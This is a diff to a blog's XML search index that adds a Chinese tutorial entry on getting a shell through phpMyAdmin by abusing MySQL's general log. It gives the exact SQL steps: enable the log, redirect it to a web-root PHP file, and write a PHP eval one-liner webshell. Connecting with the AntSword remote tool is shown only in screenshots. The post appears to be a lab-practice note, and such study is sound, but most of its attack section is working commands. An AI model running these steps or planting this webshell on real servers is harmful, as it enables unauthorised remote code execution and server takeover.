@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>phpmyadmin 日志getshell</title>
+      <link href="/2023/11/28/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/phpmyadmin%E6%97%A5%E5%BF%97getshell/"/>
+      <url>/2023/11/28/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/phpmyadmin%E6%97%A5%E5%BF%97getshell/</url>
+      
+        <content type="html"><![CDATA[<h1 id="phpmyadmin-日志getshell"><a href="#phpmyadmin-日志getshell" class="headerlink" title="phpmyadmin 日志getshell"></a>phpmyadmin 日志getshell</h1><h2 id="前提：拥有开启日志或修改日志的权限"><a href="#前提：拥有开启日志或修改日志的权限" class="headerlink" title="前提：拥有开启日志或修改日志的权限"></a>前提：拥有开启日志或修改日志的权限</h2><h2 id="查看日志是否开启"><a href="#查看日志是否开启" class="headerlink" title="查看日志是否开启"></a>查看日志是否开启</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> ‘general<span class="operator">%</span>’;</span><br></pre></td></tr></table></figure><p><img src="C:/Users/Enderman/AppData/Roaming/Typora/typora-user-images/image-20231128001425463.png" alt="image-20231128001425463"></p><h2 id="开启日志"><a href="#开启日志" class="headerlink" title="开启日志"></a>开启日志</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>;</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230812144205330.png" alt="image-20230812144205330"></p><h2 id="修改日志的路径到一个外部可访问的路径"><a href="#修改日志的路径到一个外部可访问的路径" class="headerlink" title="修改日志的路径到一个外部可访问的路径"></a>修改日志的路径到一个外部可访问的路径</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;C:/phpStudy/WWW/rizhi.php&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="利用phpmyadmin日志的漏洞，写入一句话木马"><a href="#利用phpmyadmin日志的漏洞，写入一句话木马" class="headerlink" title="利用phpmyadmin日志的漏洞，写入一句话木马"></a>利用phpmyadmin日志的漏洞，写入一句话木马</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[1]); ?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>此时木马已经被记录在日志里了</p><p>靶机视角：</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230812151901263.png" alt="image-20230812151901263"></p><h2 id="利用远控工具链接一句话木马（蚁剑）"><a href="#利用远控工具链接一句话木马（蚁剑）" class="headerlink" title="利用远控工具链接一句话木马（蚁剑）"></a>利用远控工具链接一句话木马（蚁剑）</h2><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230812154346115.png" alt="image-20230812154346115"></p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230812154426380.png" alt="image-20230812154426380"></p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230812155151866.png" alt="image-20230812155151866"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安基础 </category>
+          
+          <category> getshell </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网安基础 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>bilLu</title>
       <link href="/2023/11/27/htb%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/bilLu/"/>
       <url>/2023/11/27/htb%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/bilLu/</url>
